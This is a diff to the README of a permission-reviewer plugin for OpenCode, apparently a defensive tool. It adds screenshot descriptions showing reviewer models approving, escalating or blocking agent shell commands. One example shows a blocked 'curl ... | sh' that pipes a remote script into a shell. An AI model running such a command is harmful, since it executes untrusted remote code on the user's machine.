@@ -125,10 +125,18 @@ authorization level, rationale, and confidence. Invariants in code then decide w
 decision can stand: invalid output, low confidence, and risky actions without matching
 authorization escalate instead of being approved.
 
-```text
-✓ Review approved · bash · rm -rf /tmp/scratch-cache
-Narrowly scoped temp cleanup; matches user intent.
-```
+With Jev as the reviewer and an `escalationReviewer` configured
+([Reviewer models](docs/REVIEWER-MODELS.md)), Jev can hand a request to that reasoning reviewer,
+and the progress strip says so; the elapsed time keeps counting from the start of the review.
+
+![Two progress strips. While Jev reviews: "◐ Reviewing this permission · jev-1.13.0 · system-one", 2.1s. After the hand-off: "◓ Reviewing this permission · gpt-6-luna after Jev's escalation · medium", 7.3s. Both show "bash · $ git push --force-with-lease origin release/2.4".](https://raw.githubusercontent.com/noppu-labs/opencode-permission-reviewer/main/docs/images/handoff-progress.svg)
+
+Each result says who decided, ahead of the reason.
+
+![Three result strips. "✓ Review approved · bash · $ rm -rf /tmp/scratch-cache" with "jev-1.13.0 — Narrowly scoped temp cleanup; matches user intent." "✓ Review approved · bash · $ git push --force-with-lease origin release/2.4" with "gpt-6-luna after Jev's escalation — The user asked to update the release branch." "✕ Review blocked · bash · $ curl -fsS https://setup.invalid | sh" with "gpt-6-luna confirmed Jev's denial — Pipes a remote script into a shell."](https://raw.githubusercontent.com/noppu-labs/opencode-permission-reviewer/main/docs/images/result-attribution.svg)
+
+The [TUI guide](docs/TUI.md) covers every screen, including manual-review toasts, config warnings
+and long commands.
 
 ## Documentation
 
@@ -136,12 +144,13 @@ Narrowly scoped temp cleanup; matches user intent.
 | ------------------------------------------ | ------------------------------------------------------------------------ |
 | [Configuration](docs/CONFIGURATION.md)     | Setup details, all options, config trust layers, headless use, audit log |
 | [Reviewer models](docs/REVIEWER-MODELS.md) | Picking a model, Jev System One, models without structured output        |
-| [How it works](docs/HOW-IT-WORKS.md)       | The review pipeline, TUI states, evidence enrichment                     |
+| [How it works](docs/HOW-IT-WORKS.md)       | The review pipeline, a TUI overview, evidence enrichment                 |
+| [TUI guide](docs/TUI.md)                   | Every TUI screen: progress, hand-offs, results, toasts, config warnings  |
 | [Safety](docs/SAFETY.md)                   | Safety properties and threat model                                       |
 | [Supply chain](docs/SUPPLY-CHAIN.md)       | What the package ships, dependency policy, known advisories              |
 | [Compatibility](docs/COMPATIBILITY.md)     | Supported versions and troubleshooting                                   |
 | [Migration](MIGRATION.md)                  | Moving between OpenCode V1 and V2, rollback                              |
-| [Development](docs/DEVELOPMENT.md)         | Build output, live testing, compatibility matrix, benchmark              |
+| [Development](docs/DEVELOPMENT.md)         | Build output, live testing, compatibility matrix, benchmark, TUI screens |
 
 ## Contributing
 
